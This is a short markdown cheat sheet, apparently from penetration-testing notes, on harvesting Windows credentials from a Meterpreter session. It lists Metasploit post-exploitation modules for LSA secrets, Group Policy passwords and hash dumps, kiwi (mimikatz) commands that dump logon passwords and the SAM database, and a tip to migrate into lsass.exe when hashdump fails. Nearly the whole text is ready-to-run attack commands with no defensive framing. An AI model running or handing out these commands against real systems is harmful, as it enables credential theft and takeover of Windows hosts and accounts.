# Meterpreter

### <mark style="color:orange;">Meterpreter Modules</mark>

```
post/windows/manage/wdigest_caching

post/windows/gather/lsa_secrets

post/windows/gather/credentials/gpp

post/windows/gather/lsa_secrets

post/windows/gather/smart_hashdump
```

### <mark style="color:orange;">kiwi</mark>

```
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
```

### <mark style="color:orange;">hashdump</mark>

```
meterpreter > hashdump
```

if it failes, inject the meterpreter to the lsass.exe process with migrate command

```
migrate -N lsass.exe
```
